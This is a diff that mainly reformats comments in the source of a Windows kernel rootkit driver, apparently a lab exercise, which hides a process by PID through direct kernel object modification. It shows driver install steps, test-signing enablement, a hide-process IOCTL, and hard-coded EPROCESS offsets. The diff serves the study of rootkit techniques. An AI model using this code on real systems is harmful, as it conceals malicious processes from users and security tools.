@@ -3,34 +3,34 @@
 
 
 
-// Name:							KernelRootkit006_DKOM
-// IDE:								Open Visual Studio
-// Template:						Create a new project -> Search for templates (Alt + S) -> Kernel Mode Driver, Empty (KMDF) -> Next
-// Project:							Project Name: KMDFDriver_DKOM -> Solution Name: KernelRootkit006_DKOM -> Create
-// Source File:						Source Files -> Add -> New Item... -> Driver.c
-// Source Code:						Open Driver.c and copy the corresponding source code
-// Build Project:					Set Configuration to Release, x64 -> Build -> Build Solution
-// Add Project:						In Solution Explorer -> Right-click the solution (KernelRootkit006_DKOM) -> Add -> New Project...
-// Template:						Search for templates (Alt + S) -> Console App -> Next
-// Project:							Project name: ConsoleApp_DKOM -> Create
-// Source File:						In Solution Explorer -> Find ConsoleApp_DKOM.cpp -> Rename to Application.c
-// Source Code:						Open Application.c and copy the corresponding source code
-// Build Project:					Set Configuration to Release, x64 -> Build -> Build Solution
-// Locate Driver:					C:\Users\%USERNAME%\source\repos\KernelRootkit006_DKOM\x64\Release\KMDFDriver_DKOM.sys
-// Locate App:						C:\Users\%USERNAME%\source\repos\KernelRootkit006_DKOM\x64\Release\ConsoleApp_DKOM.exe
-// Virtual Machine:					Open VMware Workstation -> Power on (MalwareWindows11) virtual machine
-// Move Driver:						Copy KMDFDriver_DKOM.sys (Host) to C:\Users\%USERNAME%\Downloads\KMDFDriver_DKOM.sys (VM)
-// Move App:						Move ConsoleApp_DKOM.exe (Host) to C:\Users\%USERNAME%\Downloads\ConsoleApp_DKOM.exe (VM)
-// Enable Test Mode:				Open a CMD window as Administrator -> bcdedit /set testsigning on -> Restart
-// Driver Installation:				Open a CMD window as Administrator -> sc.exe create WindowsKernelDKOM type=kernel start=demand binpath="C:\Users\%USERNAME%\Downloads\KMDFDriver_DKOM.sys"
-// Registered Driver:				Open AutoRuns as Administrator -> Navigate to the Drivers tab -> Look for WindowsKernelDKOM
-// Service Status:					Run in CMD as Administrator -> sc.exe query WindowsKernelDKOM -> driverquery.exe
-// Registry Entry:					Open regedit -> Navigate to HKLM\SYSTEM\CurrentControlSet\Services -> Look for WindowsKernelDKOM
-// Monitor Messages:				Open DebugView as Administrator -> Enable options ("Capture -> Capture Kernel" and "Capture -> Enable Verbose Kernel Output") -> Close and reopen DebugView as Administrator
-// Start Routine:					Run in CMD as Administrator -> sc.exe start WindowsKernelDKOM
-// User Mode App:					Open CMD -> Navigate to the directory -> Run ConsoleApp_DKOM.exe
-// Clean:							Run in CMD as Administrator -> sc.exe stop WindowsKernelDKOM
-// Remove:							Run in CMD as Administrator -> sc.exe delete WindowsKernelDKOM
+// Name:                            KernelRootkit006_DKOM
+// IDE:                             Open Visual Studio
+// Template:                        Create a new project -> Search for templates (Alt + S) -> Kernel Mode Driver, Empty (KMDF) -> Next
+// Project:                         Project Name: KMDFDriver_DKOM -> Solution Name: KernelRootkit006_DKOM -> Create
+// Source File:                     Source Files -> Add -> New Item... -> Driver.c
+// Source Code:                     Open Driver.c and copy the corresponding source code
+// Build Project:                   Set Configuration to Release, x64 -> Build -> Build Solution
+// Add Project:                     In Solution Explorer -> Right-click the solution (KernelRootkit006_DKOM) -> Add -> New Project...
+// Template:                        Search for templates (Alt + S) -> Console App -> Next
+// Project:                         Project name: ConsoleApp_DKOM -> Create
+// Source File:                     In Solution Explorer -> Find ConsoleApp_DKOM.cpp -> Rename to Application.c
+// Source Code:                     Open Application.c and copy the corresponding source code
+// Build Project:                   Set Configuration to Release, x64 -> Build -> Build Solution
+// Locate Driver:                   C:\Users\%USERNAME%\source\repos\KernelRootkit006_DKOM\x64\Release\KMDFDriver_DKOM.sys
+// Locate App:                      C:\Users\%USERNAME%\source\repos\KernelRootkit006_DKOM\x64\Release\ConsoleApp_DKOM.exe
+// Virtual Machine:                 Open VMware Workstation -> Power on (MalwareWindows11) virtual machine
+// Move Driver:                     Copy KMDFDriver_DKOM.sys (Host) to C:\Users\%USERNAME%\Downloads\KMDFDriver_DKOM.sys (VM)
+// Move App:                        Move ConsoleApp_DKOM.exe (Host) to C:\Users\%USERNAME%\Downloads\ConsoleApp_DKOM.exe (VM)
+// Enable Test Mode:                Open a CMD window as Administrator -> bcdedit /set testsigning on -> Restart
+// Driver Installation:             Open a CMD window as Administrator -> sc.exe create WindowsKernelDKOM type=kernel start=demand binpath="C:\Users\%USERNAME%\Downloads\KMDFDriver_DKOM.sys"
+// Registered Driver:               Open AutoRuns as Administrator -> Navigate to the Drivers tab -> Look for WindowsKernelDKOM
+// Service Status:                  Run in CMD as Administrator -> sc.exe query WindowsKernelDKOM -> driverquery.exe
+// Registry Entry:                  Open regedit -> Navigate to HKLM\SYSTEM\CurrentControlSet\Services -> Look for WindowsKernelDKOM
+// Monitor Messages:                Open DebugView as Administrator -> Enable options ("Capture -> Capture Kernel" and "Capture -> Enable Verbose Kernel Output") -> Close and reopen DebugView as Administrator
+// Start Routine:                   Run in CMD as Administrator -> sc.exe start WindowsKernelDKOM
+// User Mode App:                   Open CMD -> Navigate to the directory -> Run ConsoleApp_DKOM.exe
+// Clean:                           Run in CMD as Administrator -> sc.exe stop WindowsKernelDKOM
+// Remove:                          Run in CMD as Administrator -> sc.exe delete WindowsKernelDKOM
 
 
 
@@ -57,25 +57,18 @@
 /**
 	@brief		An I/O control code is a 32-bit value that consists of several fields (https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/defining-i-o-control-codes).
 
-				When defining new IOCTLs, it is important to remember the following rules:
+	@details	When defining new IOCTLs, it is important to remember the following rules:
+	@details		- If a new IOCTL will be available to user-mode software components, the IOCTL must be used with IRP_MJ_DEVICE_CONTROL requests. User-mode components send IRP_MJ_DEVICE_CONTROL requests by calling the DeviceIoControl, which is a Win32 function.
+	@details		- If a new IOCTL will be available only to kernel-mode driver components, the IOCTL must be used with IRP_MJ_INTERNAL_DEVICE_CONTROL requests. Kernel-mode components create IRP_MJ_INTERNAL_DEVICE_CONTROL requests by calling IoBuildDeviceIoControlRequest.
 
-					- If a new IOCTL will be available to user-mode software components, the IOCTL must be used with IRP_MJ_DEVICE_CONTROL requests. User-mode components send IRP_MJ_DEVICE_CONTROL requests by calling the DeviceIoControl, which is a Win32 function.
-					- If a new IOCTL will be available only to kernel-mode driver components, the IOCTL must be used with IRP_MJ_INTERNAL_DEVICE_CONTROL requests. Kernel-mode components create IRP_MJ_INTERNAL_DEVICE_CONTROL requests by calling IoBuildDeviceIoControlRequest.
+	@details	Use the system-supplied CTL_CODE macro, which is defined in Wdm.h and Ntddk.h, to define new I/O control codes. The definition of a new IOCTL code, whether intended for use with IRP_MJ_DEVICE_CONTROL or IRP_MJ_INTERNAL_DEVICE_CONTROL requests, uses the following format:
+	@details		#define IOCTL_Device_Function CTL_CODE(DeviceType, Function, Method, Access)
 
-				Use the system-supplied CTL_CODE macro, which is defined in Wdm.h and Ntddk.h, to define new I/O control codes. The definition of a new IOCTL code, whether intended for use with IRP_MJ_DEVICE_CONTROL or IRP_MJ_INTERNAL_DEVICE_CONTROL requests, uses the following format:
-
-				#define IOCTL_Device_Function CTL_CODE(DeviceType, Function, Method, Access)
-
-
-				Supply the following parameters to the CTL_CODE macro:
-
-				DeviceType			This value must match the value that is set in the DeviceType member of the driver's DEVICE_OBJECT structure (https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/specifying-device-types).
-
-				FunctionCode		Identifies the function to be performed by the driver. Values of less than 0x800 are reserved for Microsoft. Values of 0x800 and higher can be used by vendors.
-
-				TransferType		Indicates how the system will pass data between the caller of DeviceIoControl (or IoBuildDeviceIoControlRequest) and the driver that handles the IRP (METHOD_BUFFERED, METHOD_IN_DIRECT, METHOD_OUT_DIRECT, METHOD_NEITHER).
-
-				RequiredAccess		Indicates the type of access that a caller must request when opening the file object that represents the device (FILE_ANY_ACCESS, FILE_READ_DATA, FILE_READ_DATA, FILE_READ_DATA and FILE_WRITE_DATA).
+	@details	Supply the following parameters to the CTL_CODE macro:
+	@param			DeviceType			This value must match the value that is set in the DeviceType member of the driver's DEVICE_OBJECT structure (https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/specifying-device-types).
+	@param			FunctionCode		Identifies the function to be performed by the driver. Values of less than 0x800 are reserved for Microsoft. Values of 0x800 and higher can be used by vendors.
+	@param			TransferType		Indicates how the system will pass data between the caller of DeviceIoControl (or IoBuildDeviceIoControlRequest) and the driver that handles the IRP (METHOD_BUFFERED, METHOD_IN_DIRECT, METHOD_OUT_DIRECT, METHOD_NEITHER).
+	@param			RequiredAccess		Indicates the type of access that a caller must request when opening the file object that represents the device (FILE_ANY_ACCESS, FILE_READ_DATA, FILE_READ_DATA, FILE_READ_DATA and FILE_WRITE_DATA).
 **/
 #define IOCTL_HIDE_PROCESS_BY_PID CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
@@ -101,8 +94,8 @@ UNICODE_STRING Global_Device_Symbolic_Link;
 	@brief		Removes a process from the ActiveProcessLinks list in the Windows kernel's EPROCESS structure.
 
 
-				PLIST_ENTRY				https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-list_entry
-	@param		currListEntry			Pointer to the LIST_ENTRY structure that needs to be unlinked from the process list.
+	@see		PLIST_ENTRY				https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-list_entry
+	@param[in]	currListEntry			Pointer to the LIST_ENTRY structure that needs to be unlinked from the process list.
 **/
 VOID
 DirectKernelObjectModification_UnlinkProcessEntry(
@@ -153,8 +146,8 @@ DirectKernelObjectModification_UnlinkProcessEntry(
 	@brief		 Walks through the ActiveProcessLinks list to find and hide a process by its PID.
 
 
-				UINT32					https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#UINT32
-	@param		pid						The process ID (PID) of the process to hide.
+	@see		UINT32					https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types#UINT32
+	@param[in]	pid						The process ID (PID) of the process to hide.
 
 
 	@return		TRUE if the process was found and hidden, FALSE otherwise.
@@ -179,10 +172,14 @@ DirectKernelObjectModification_WarningOffsetsHideProcessByPID(
 	// https://www.vergiliusproject.com/kernels/x64/Windows%2011/23H2%20(2023%20Update)/_EPROCESS
 	// Open WinDbg as Administrator -> File -> Attach to kernel -> dt _EPROCESS -> Check offsets for your version
 
-	BOOLEAN foundProcess = FALSE;								// Process found flag
-	UINT32* currUniqueProcessId = NULL;							// Current process id
-	ULONG_PTR EPROCESSS_ActiveProcessLinksOffset = 0x1d8;		// Offset for EPROCESS ActiveProcessLinks field
-	ULONG_PTR EPROCESS_UniqueProcessIdOffset = 0x1d0;			// Offset for EPROCESS UniqueProcessId field
+	// Process found flag
+	BOOLEAN foundProcess = FALSE;
+	// Current process id
+	UINT32* currUniqueProcessId = NULL;
+	// Offset for EPROCESS ActiveProcessLinks field
+	ULONG_PTR EPROCESSS_ActiveProcessLinksOffset = 0x1d8;
+	// Offset for EPROCESS UniqueProcessId field
+	ULONG_PTR EPROCESS_UniqueProcessIdOffset = 0x1d0;
 
 
 	// ---------------------------------------------------------------------------------------------------------------------
@@ -263,12 +260,11 @@ DirectKernelObjectModification_WarningOffsetsHideProcessByPID(
 
 /**
 	@brief		Unloads a Windows kernel-mode driver.
+	@details	This function is called when the driver is being unloaded from memory. It is responsible for cleaning up resources and performing necessary cleanup tasks before the driver is removed from the system. For guidelines and implementation details, see the Microsoft documentation at: https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_unload
 
-				This function is called when the driver is being unloaded from memory. It is responsible for cleaning up resources and performing necessary cleanup tasks before the driver is removed from the system. For guidelines and implementation details, see the Microsoft documentation at: https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_unload
 
-
-				PDRIVER_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object
-	@param		pDriverObject			Pointer to a DRIVER_OBJECT structure representing the driver.
+	@see		PDRIVER_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object
+	@param[in]	pDriverObject			Pointer to a DRIVER_OBJECT structure representing the driver.
 **/
 VOID
 DriverUnload(
@@ -321,12 +317,11 @@ DriverUnload(
 	@brief		A passthrough function for handling IRPs (I/O Request Packets).
 
 
-				PDEVICE_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
-	@param		pDeviceObject			Pointer to a DEVICE_OBJECT structure representing the device.
+	@see		PDEVICE_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
+	@param[in]	pDeviceObject			Pointer to a DEVICE_OBJECT structure representing the device.
 
-
-				PIRP					https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp
-	@param		pIrp					Pointer to an IRP (I/O Request Packet) to be processed.
+	@see		PIRP					https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp
+	@param[in]	pIrp					Pointer to an IRP (I/O Request Packet) to be processed.
 
 
 	@return		A NTSTATUS value indicating success or an error code if operation fails.
@@ -388,12 +383,11 @@ DriverPassthrough(
 	@brief		Handles IOCTLs (Input/Output Control) requests from userland.
 
 
-				PDEVICE_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
-	@param		pDeviceObject			Pointer to a DEVICE_OBJECT structure representing the device.
+	@see		PDEVICE_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_device_object
+	@param[in]	pDeviceObject			Pointer to a DEVICE_OBJECT structure representing the device.
 
-
-				PIRP					https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp
-	@param		pIrp					Pointer to an IRP (I/O Request Packet) to be processed.
+	@see		PIRP					https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp
+	@param[in]	pIrp					Pointer to an IRP (I/O Request Packet) to be processed.
 
 
 	@return		A NTSTATUS value indicating success or an error code if operation fails.
@@ -507,16 +501,14 @@ DriverHandleIOCTLs(
 
 /**
 	@brief		Entry point for a Windows kernel-mode driver.
-	
-				This function is called when the driver is loaded into memory. It initializes the driver and performs necessary setup tasks. For guidelines and implementation details, see the Microsoft documentation at: https://learn.microsoft.com/en-us/windows-hardware/drivers/wdf/driverentry-for-kmdf-drivers
+	@details	This function is called when the driver is loaded into memory. It initializes the driver and performs necessary setup tasks. For guidelines and implementation details, see the Microsoft documentation at: https://learn.microsoft.com/en-us/windows-hardware/drivers/wdf/driverentry-for-kmdf-drivers
 
 
-				PDRIVER_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object
-	@param		pDriverObject			Pointer to a DRIVER_OBJECT structure representing the driver's image in the operating system kernel.
+	@see		PDRIVER_OBJECT			https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object
+	@param[in]	pDriverObject			Pointer to a DRIVER_OBJECT structure representing the driver's image in the operating system kernel.
 
-
-				PUNICODE_STRING			https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string
-	@param		pRegistryPath			Pointer to a UNICODE_STRING structure, containing the driver's registry path as a Unicode string, indicating the driver's location in the Windows registry.
+	@see		PUNICODE_STRING			https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string
+	@param[in]	pRegistryPath			Pointer to a UNICODE_STRING structure, containing the driver's registry path as a Unicode string, indicating the driver's location in the Windows registry.
 
 
 	@return		A NTSTATUS value indicating success or an error code if initialization fails.
